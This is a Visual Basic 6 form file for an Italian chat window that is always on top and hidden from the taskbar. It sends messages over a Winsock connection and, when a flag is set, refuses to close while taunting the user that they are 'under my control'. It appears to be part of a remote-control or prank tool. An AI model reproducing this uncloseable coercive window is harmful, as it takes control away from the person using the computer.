VERSION 5.00
Begin VB.Form Form2 
   BackColor       =   &H00000000&
   BorderStyle     =   0  'None
   Caption         =   "Chat "
   ClientHeight    =   2955
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   5175
   LinkTopic       =   "Form2"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2955
   ScaleWidth      =   5175
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.TextBox Text1 
      Height          =   375
      Left            =   5520
      TabIndex        =   3
      Text            =   "1"
      Top             =   720
      Width           =   375
   End
   Begin VB.ListBox List1 
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "Comic Sans MS"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   2055
      Left            =   120
      TabIndex        =   2
      Top             =   120
      Width           =   4935
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Invia"
      Height          =   255
      Left            =   3840
      TabIndex        =   1
      Top             =   2520
      Width           =   1095
   End
   Begin VB.TextBox Text2 
      BackColor       =   &H00000000&
      ForeColor       =   &H0000FF00&
      Height          =   285
      Left            =   120
      TabIndex        =   0
      Top             =   2520
      Width           =   3615
   End
End
Attribute VB_Name = "Form2"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function SetWindowPos Lib "user32.dll" (ByVal hWnd As Long, _
    ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal y As Long, _
    ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Private Const HWND_TOP As Long = 0
Private Const HWND_TOPMOST As Long = -1
Private Const HWND_NOTOPMOST As Long = -2
Private Const SWP_NOMOVE As Long = &H2
Private Const SWP_NOSIZE  As Long = &H1
Private Sub Command1_Click()
Form1.Winsock1.SendData "chat|" & Form1.Text8.Text & " ; " & Text2.Text
List1.AddItem Form1.Text8.Text & " ; " + Text2.Text
Text2.Text = ""
End Sub


Private Sub Form_Load()
SetWindowPos Me.hWnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE + SWP_NOSIZE


End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
If Text1.Text = 1 Then
MsgBox "Non ci provare >:D sei sotto il mio controllo!!", vbExclamation
Cancel = True
Else
Cancel = False

End If





End Sub

Private Sub Text2_KeyPress(KeyAscii As Integer)
If KeyAscii = 13 Then
Form1.Winsock1.SendData "chat|" & Form1.Text8.Text & " ; " & Text2.Text
List1.AddItem Form1.Text8.Text & " ; " + Text2.Text
Text2.Text = ""

End If
List1.ListIndex = List1.NewIndex
End Sub


